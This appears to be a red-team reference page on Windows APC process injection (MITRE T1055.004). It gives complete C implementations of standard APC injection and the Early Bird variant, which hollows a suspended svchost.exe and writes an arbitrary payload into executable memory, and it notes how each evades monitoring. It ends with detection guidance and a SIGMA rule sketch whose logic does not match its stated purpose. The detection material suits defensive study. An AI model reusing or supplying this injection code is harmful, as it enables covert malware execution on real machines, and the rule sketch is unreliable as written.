# APC Queue Injection

**MITRE ATT&CK**: T1055.004 - Process Injection: Asynchronous Procedure Call

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

Asynchronous Procedure Calls (APCs) are a Windows mechanism that allows code to
execute asynchronously in the context of a specific thread. Each thread has an APC
queue; when the thread enters an alertable wait state (e.g., SleepEx, WaitForSingleObjectEx
with bAlertable=TRUE, or SignalObjectAndWait), pending APCs are executed.

Injection via APC avoids calling CreateRemoteThread, which is one of the most monitored
APIs. Instead, the payload is queued as an APC to an existing thread in the target process.

## Key Concepts

- **Alertable State**: A thread must be in an alertable wait for user-mode APCs to fire.
  Functions that enter alertable state include: SleepEx, WaitForSingleObjectEx,
  WaitForMultipleObjectsEx, MsgWaitForMultipleObjectsEx, SignalObjectAndWait.
- **Early Bird Variant**: Create a new process in SUSPENDED state, queue APC to its
  main thread before it initializes. When the process resumes, the APC fires during
  ntdll initialization before the main entry point.

## API Call Pattern

```
OpenProcess / CreateProcess(SUSPENDED)
    --> VirtualAllocEx (allocate in target)
    --> WriteProcessMemory (write payload)
    --> OpenThread or use thread handle from CreateProcess
    --> QueueUserAPC (queue payload to thread's APC queue)
    --> ResumeThread (for Early Bird) or wait for alertable state
```

## C Implementation - Standard APC Injection

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/*
 * APC injection targeting existing threads in a running process.
 * We enumerate threads using CreateToolhelp32Snapshot and queue
 * the APC to each thread we find, hoping at least one enters
 * an alertable wait state.
 */

int apc_inject(DWORD targetPid, unsigned char *payload, SIZE_T payloadSize) {

    // Step 1: Open the target process for memory operations
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE, targetPid
    );
    if (!hProcess) {
        printf("[!] OpenProcess failed: %lu\n", GetLastError());
        return -1;
    }

    // Step 2: Allocate and write payload (same as classic injection)
    LPVOID remoteBuf = VirtualAllocEx(
        hProcess, NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if (!remoteBuf) {
        CloseHandle(hProcess);
        return -1;
    }

    SIZE_T written;
    WriteProcessMemory(hProcess, remoteBuf, payload, payloadSize, &written);

    // Step 3: Enumerate threads belonging to the target process
    // CreateToolhelp32Snapshot with TH32CS_SNAPTHREAD captures all threads
    // system-wide; we filter by th32OwnerProcessID.
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return -1;
    }

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);  // MUST set dwSize before calling Thread32First

    if (!Thread32First(hSnapshot, &te)) {
        CloseHandle(hSnapshot);
        CloseHandle(hProcess);
        return -1;
    }

    // Step 4: Queue APC to each thread in the target process
    do {
        if (te.th32OwnerProcessID == targetPid) {
            // Open the thread with THREAD_SET_CONTEXT right
            // which is required for QueueUserAPC
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (hThread) {
                // QueueUserAPC adds our payload address to the thread's APC queue.
                // The APC will fire when the thread enters an alertable wait.
                // The function prototype matches PAPCFUNC: void (ULONG_PTR param)
                QueueUserAPC(
                    (PAPCFUNC)remoteBuf,  // pfnAPC - pointer to function to execute
                    hThread,               // hThread - target thread
                    0                      // dwData - parameter passed to APC function
                );
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnapshot, &te));

    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
    return 0;
}
```

## Early Bird Variant

```c
/*
 * Early Bird APC Injection:
 * Create a legitimate process in SUSPENDED state, inject before it initializes.
 * The APC fires during ntdll!LdrInitializeThunk before the main entry point.
 *
 * Advantages over standard APC injection:
 *   - No need to enumerate threads or hope for alertable state
 *   - The main thread of a suspended process WILL execute the APC on resume
 *   - The payload runs before most userland hooks are active
 */

int earlybird_inject(unsigned char *payload, SIZE_T payloadSize) {

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // Create a legitimate process in SUSPENDED state
    // svchost.exe or RuntimeBroker.exe are common choices for blending in
    BOOL created = CreateProcessA(
        "C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,   // Process created but main thread is suspended
        NULL, NULL, &si, &pi
    );
    if (!created) return -1;

    // Allocate and write payload into the new process
    LPVOID remoteBuf = VirtualAllocEx(
        pi.hProcess, NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    WriteProcessMemory(pi.hProcess, remoteBuf, payload, payloadSize, NULL);

    // Queue APC to the main thread (pi.hThread from CreateProcess)
    // This APC is guaranteed to execute when the thread resumes because
    // the thread starts via NtTestAlert which drains the APC queue
    QueueUserAPC((PAPCFUNC)remoteBuf, pi.hThread, 0);

    // Resume the thread -- APC fires during process initialization
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

## Detection & Prevention

### Sysmon Events

**Event ID 10 (ProcessAccess)**: OpenProcess with VM_WRITE access to another process.
Same detection logic as classic injection for the memory allocation and write phase.

**Event ID 8 (CreateRemoteThread)**: Note that QueueUserAPC does NOT trigger Sysmon
Event ID 8 in default configurations -- this is a key evasion advantage over
CreateRemoteThread. However, some EDRs have added specific telemetry for APC queuing.

**Event ID 1 (ProcessCreate)**: For Early Bird, the creation of a process in suspended
state followed quickly by a ResumeThread is suspicious. Detection rules look for
short-lived suspended processes, especially when the creating process is unusual.

### API Monitoring and ETW

- **NtQueueApcThread / NtQueueApcThreadEx**: The underlying NT API calls. EDRs that
  hook at the ntdll level can intercept these. The Microsoft-Windows-Threat-Intelligence
  ETW provider emits events for APC queuing in newer Windows versions.

- **Cross-process APC**: Legitimate cross-process APCs are rare. Any call to
  QueueUserAPC where the target thread belongs to a different process is suspicious.

### Behavioral Detection

1. **Process Creation + Immediate Memory Write + APC**: The Early Bird pattern of
   CREATE_SUSPENDED followed by VirtualAllocEx + WriteProcessMemory + QueueUserAPC
   + ResumeThread is a detectable chain.

2. **Thread enumeration via Toolhelp32**: The standard variant's thread enumeration
   using CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD) is logged and can be correlated
   with subsequent APC calls.

3. **Multiple APCs queued**: Queuing APCs to many threads (shotgun approach) is
   abnormal behavior. Legitimate software targets specific threads.

### Prevention

- **Arbitrary Code Guard (ACG)**: Prevents dynamic code generation and execution.
  Processes with ACG enabled reject execution of dynamically allocated RWX memory.
- **CIG (Code Integrity Guard)**: Blocks loading of unsigned code in protected processes.
- **PPL (Protected Process Light)**: Prevents handle acquisition against protected
  processes, blocking the OpenProcess step entirely.
- **Credential Guard**: Isolates lsass.exe, preventing common injection targets.

### SIGMA Rule Sketch

```yaml
title: Suspicious Process Created in Suspended State with Early APC Pattern
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        EventID: 1
        ParentCommandLine|contains: 'svchost'
    filter:
        ParentImage|endswith: '\services.exe'
    condition: selection and not filter
level: medium
```
